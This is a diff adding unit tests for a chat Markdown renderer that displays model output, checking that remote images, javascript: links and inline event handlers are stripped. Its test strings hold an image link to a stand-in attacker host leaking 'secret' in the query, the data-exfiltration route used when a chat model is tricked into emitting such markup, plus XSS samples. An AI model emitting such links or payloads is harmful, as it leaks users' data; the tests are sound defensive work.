@@ -1,7 +1,7 @@
 import { createElement } from 'react';
 import { renderToStaticMarkup } from 'react-dom/server';
 import { describe, expect, it } from 'vitest';
-import { DocumentMarkdown, safeDocumentUrl } from './DocumentMarkdown';
+import { ChatMarkdown, DocumentMarkdown, safeDocumentUrl } from './DocumentMarkdown';
 
 function render(content: string): string {
   return renderToStaticMarkup(createElement(DocumentMarkdown, { content }));
@@ -61,5 +61,35 @@ describe('safe document Markdown', () => {
     expect(safeDocumentUrl('mailto:contact@example.invalid')).toBe(
       'mailto:contact@example.invalid',
     );
+  });
+});
+
+describe('safe chat Markdown', () => {
+  function renderChat(content: string): string {
+    return renderToStaticMarkup(createElement(ChatMarkdown, { content }));
+  }
+
+  it('never loads remote images from model output, including reference-style images', () => {
+    const html = renderChat(
+      '![x](https://attacker.invalid/leak?d=secret)\n\n![ref][img]\n\n[img]: https://attacker.invalid/ref.png',
+    );
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('src=');
+    expect(html).not.toContain('attacker.invalid');
+    expect(html).toContain('Imagen omitida: x.');
+  });
+
+  it('renders GFM tables and keeps only explicit safe link destinations', () => {
+    const html = renderChat(
+      '| Plan | Precio |\n| --- | --- |\n| Base | 10 |\n\n[Sitio](https://example.com/help) [Mal](javascript:alert%281%29) <b onclick="x()">raw</b>',
+    );
+    expect(html).toContain('<table>');
+    expect(html).toContain('<td>Base</td>');
+    expect(html).toContain('href="https://example.com/help"');
+    expect(html).toContain('rel="noopener noreferrer"');
+    expect(html).toContain('<svg');
+    expect(html).not.toContain('javascript:');
+    expect(html).not.toContain('onclick');
+    expect(html).toContain('<span>Mal</span>');
   });
 });
